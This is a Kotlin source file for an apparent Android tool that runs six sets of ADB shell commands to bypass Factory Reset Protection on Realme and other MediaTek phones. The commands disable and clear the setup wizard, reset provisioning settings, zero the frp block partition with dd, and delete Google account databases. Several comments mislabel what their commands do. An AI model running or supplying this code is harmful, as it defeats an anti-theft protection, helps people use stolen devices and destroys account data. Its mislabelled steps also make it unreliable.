package com.deepeye.otg.engine

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import timber.log.Timber

/**
 * ADB-based FRP Bypass Engine for MTP-connected devices
 * Works without BROM/EDL - uses ADB shell commands
 * Target: Realme RMX3845 and similar MediaTek devices
 */
class AdbFrpBypassEngine(
    private val adbExecutor: (String) -> Result<String>
) {

    // ── METHOD 1: Settings DB direct clear ──────────────
    suspend fun method1_clearSettingsDb(): BypassResult =
        withContext(Dispatchers.IO) {
            Timber.d("[FRP] Method 1: Settings DB clear")
            val commands = listOf(
                // FRP partition clear
                "content delete --uri content://settings/secure --where \"name='android_id'\"",
                // Google account remove
                "content delete --uri content://com.android.providers.contacts/raw_contacts",
                // FRP flag reset
                "settings put global setup_wizard_has_run 0",
                "settings put secure user_setup_complete 0",
                "settings put global device_provisioned 0",
            )
            executeCommands(commands, "Method1_SettingsDB")
        }

    // ── METHOD 2: Package Manager FRP unlock ────────────
    suspend fun method2_packageManagerBypass(): BypassResult =
        withContext(Dispatchers.IO) {
            Timber.d("[FRP] Method 2: Package Manager bypass")
            val commands = listOf(
                // Enable hidden settings
                "pm grant com.android.settings android.permission.WRITE_SECURE_SETTINGS",
                // Disable FRP enforcement
                "pm disable-user --user 0 com.google.android.setupwizard",
                "pm disable-user --user 0 com.android.setupwizard",
                // Clear setup wizard data
                "pm clear com.google.android.setupwizard",
                "pm clear com.android.setupwizard",
            )
            executeCommands(commands, "Method2_PackageManager")
        }

    // ── METHOD 3: Realme-specific OEM bypass ─────────────
    suspend fun method3_realmeSpecific(): BypassResult =
        withContext(Dispatchers.IO) {
            Timber.d("[FRP] Method 3: Realme RMX3845 specific")
            val commands = listOf(
                // Realme FRP partition
                "am start -n com.android.settings/com.android.settings.Settings",
                // Bypass via accessibility
                "settings put secure enabled_accessibility_services com.android.talkback/com.google.android.marvin.talkback.TalkBackService",
                // Realme specific frp props
                "setprop persist.sys.oem_unlock_allowed 1",
                "setprop ro.frp.pst /dev/block/by-name/frp",
                // Clear FRP block
                "dd if=/dev/zero of=/dev/block/by-name/frp bs=512 count=1 2>/dev/null || true",
            )
            executeCommands(commands, "Method3_Realme")
        }

    // ── METHOD 4: Factory Reset Protection DB ───────────
    suspend fun method4_frpDatabaseClear(): BypassResult =
        withContext(Dispatchers.IO) {
            Timber.d("[FRP] Method 4: FRP Database clear")
            val commands = listOf(
                // Remove Google FRP accounts
                "sqlite3 /data/system/users/0/accounts.db \"DELETE FROM accounts WHERE type='com.google';\"",
                // Alternative accounts DB path
                "rm -f /data/system_de/0/accounts.db",
                "rm -f /data/system/sync/accounts.xml",
                // Clear FRP state files
                "rm -f /data/system/frp/persistent.properties",
            )
            executeCommands(commands, "Method4_FRPDatabase")
        }

    // ── METHOD 5: Account Manager Clear ─────────────────
    suspend fun method5_accountManagerClear(): BypassResult =
        withContext(Dispatchers.IO) {
            Timber.d("[FRP] Method 5: Account Manager clear")
            val commands = listOf(
                // Remove all Google accounts via account manager
                "am start -a android.settings.SYNC_SETTINGS",
                "cmd account remove-account --help 2>/dev/null || true",
                // Clear Google Play Services data
                "pm clear com.google.android.gms",
                "pm clear com.android.vending",
                // Remove accounts.db
                "rm -f /data/system/users/0/accounts.db",
                "rm -f /data/system/users/0/accounts_de.db",
            )
            executeCommands(commands, "Method5_AccountManager")
        }

    // ── METHOD 6: Activity Manager FRP Skip ─────────────
    suspend fun method6_activityManagerBypass(): BypassResult =
        withContext(Dispatchers.IO) {
            Timber.d("[FRP] Method 6: Activity Manager bypass")
            val commands = listOf(
                // Force stop setup wizard
                "am force-stop com.google.android.setupwizard",
                "am force-stop com.android.setupwizard",
                // Start launcher directly
                "am start -c android.intent.category.HOME -a android.intent.action.MAIN",
                // Disable FRP components
                "pm disable com.google.android.setupwizard/.SetupWizardActivity",
                "pm disable com.google.android.setupwizard/.exit.ExitActivity",
            )
            executeCommands(commands, "Method6_ActivityManager")
        }

    // ── HELPER ───────────────────────────────────────────
    private suspend fun executeCommands(
        commands: List<String>,
        tag: String
    ): BypassResult {
        val results = mutableListOf<CommandResult>()
        var successCount = 0

        commands.forEach { cmd ->
            Timber.d("[$tag] Running: $cmd")
            val result = try {
                val output = adbExecutor(cmd)
                val succeeded = output.isSuccess
                if (succeeded) successCount++
                CommandResult(cmd, succeeded, output.getOrNull() ?: "Error")
            } catch (e: Exception) {
                Timber.e("[$tag] Error: ${e.message}")
                CommandResult(cmd, false, e.message ?: "Exception")
            }
            results.add(result)
            delay(300) // small delay between commands
        }

        val overallSuccess = successCount > (commands.size / 2)

        return BypassResult(
            method = tag,
            success = overallSuccess,
            commands = results,
            timestamp = System.currentTimeMillis(),
            successRate = successCount.toFloat() / commands.size.toFloat()
        )
    }
}

data class BypassResult(
    val method: String,
    val success: Boolean,
    val commands: List<CommandResult>,
    val timestamp: Long,
    val successRate: Float
)

data class CommandResult(
    val command: String,
    val success: Boolean,
    val output: String
)
